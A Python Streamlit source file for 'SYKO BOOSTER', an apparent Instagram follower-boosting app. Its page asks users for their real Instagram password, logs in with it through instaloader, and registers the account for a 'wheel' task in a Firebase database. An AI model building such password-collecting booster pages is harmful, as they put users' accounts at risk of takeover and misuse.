import streamlit as st
import requests
import instaloader
import time

# إعدادات الصفحة
st.set_page_config(page_title="SYKO BOOSTER", layout="centered")

# دالة للتحقق من الحساب عبر instaloader
def verify_insta(username, password):
    L = instaloader.Instaloader()
    try:
        L.login(username, password)
        return True, "Success"
    except Exception as e:
        return False, str(e)

# واجهة SYKO الفخمة
st.markdown("""
    <style>
    .main { background: #000; }
    .stApp { background: #000; }
    .login-card {
        background: #0a0a0a; padding: 40px;
        border-radius: 20px; border: 2px solid #00f2ff;
        text-align: center; box-shadow: 0 0 20px #00f2ff33;
    }
    .syko-logo { font-size: 40px; font-weight: bold; color: #fff; text-shadow: 0 0 10px #00f2ff; }
    input { background-color: #111 !important; color: #00f2ff !important; border: 1px solid #333 !important; }
    .stButton>button { background: #00f2ff; color: #000; font-weight: bold; width: 100%; border-radius: 10px; }
    </style>
    """, unsafe_allow_html=True)

DB_URL = "https://syko-booster-default-rtdb.firebaseio.com/"

if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False

if not st.session_state.logged_in:
    st.markdown('<div class="login-card">', unsafe_allow_html=True)
    st.markdown('<div class="syko-logo">SYKO</div>', unsafe_allow_html=True)
    st.markdown('<p style="color:#00f2ff;">REAL INSTAGRAM LOGIN</p>', unsafe_allow_html=True)
    
    u = st.text_input("Instagram Username", key="u_field")
    p = st.text_input("Instagram Password", type="password", key="p_field")
    
    if st.button("VERIFY & START WHEEL"):
        if u and p:
            with st.spinner('Checking with Instagram...'):
                success, msg = verify_insta(u, p)
                if success:
                    u_clean = u.lower().strip().replace("@","")
                    # حفظ البيانات والبدء بالدوامة
                    requests.put(f"{DB_URL}accounts/{u_clean}.json", json={"verified": True})
                    requests.post(f"{DB_URL}active_tasks.json", json={"user": u_clean})
                    
                    st.session_state.username = u_clean
                    st.session_state.logged_in = True
                    st.rerun()
                else:
                    st.error("Invalid Instagram Login Details!")
        else:
            st.warning("Please fill all fields")
    st.markdown('</div>', unsafe_allow_html=True)

else:
    st.success(f"Verified as @{st.session_state.username}")
    st.markdown("### 🎡 The Wheel is spinning for you!")
    # هنا يظهر زر تجميع الكوينز والدوامة
    if st.button("Logout"):
        st.session_state.logged_in = False
        st.rerun()
